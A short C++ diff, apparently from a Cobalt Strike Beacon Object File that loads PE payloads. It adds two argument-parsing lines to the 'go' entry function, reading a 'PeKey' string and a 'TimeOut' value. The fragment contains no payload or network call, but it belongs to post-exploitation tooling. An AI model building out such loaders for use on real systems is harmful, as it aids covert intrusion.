@@ -162,6 +162,8 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     INT32 ArgLen    = 0;
     BYTE* Arguments = (BYTE*)BeaconDataExtract( &Parser, &ArgLen );
     CHAR* ExportFnc = (CHAR*)BeaconDataExtract( &Parser, 0 ); // dll functions export case
+    CHAR* PeKey     = (CHAR*)BeaconDataExtract( &Parser, 0 );
+    INT32 TimeOut   = BeaconDataInt( &Parser );
 
     UPTR   Entry     = 0;
     ULONG  ThreadID  = 0;
